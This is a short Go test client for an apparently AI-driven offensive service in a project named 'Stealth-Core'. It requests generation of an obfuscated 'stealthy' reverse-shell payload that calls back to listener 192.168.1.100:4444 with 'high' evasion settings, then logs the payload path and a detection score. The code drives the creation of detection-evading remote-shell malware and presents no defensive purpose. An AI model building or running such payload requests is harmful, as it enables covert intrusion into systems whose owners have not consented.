package villagerai

import (
	"context"
	"log"
	"time"

	villager_pb "github.com/OpenClaw-Security/Stealth-Core/pkg/proto/villager_ai"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func TestClient() {
	conn, err := grpc.Dial("localhost:50054", grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := villager_pb.NewVillagerAIAdapterClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	r, err := c.GenerateStealthyPayload(ctx, &villager_pb.GenerateStealthyPayloadRequest{
		BasePayloadType:      "reverse_shell",
		ObfuscationTechnique: "encoding",
		HexstrikeOptions:     map[string]string{"lhost": "192.168.1.100", "lport": "4444"},
		ThesilencerOptions:   map[string]string{"level": "high"},
	})
	if err != nil {
		log.Fatalf("could not generate stealthy payload: %v", err)
	}
	log.Printf("Stealthy payload generated: %s, Detection score: %d", r.GetFinalPayloadPath(), r.GetDetectionResults().GetScore())
}
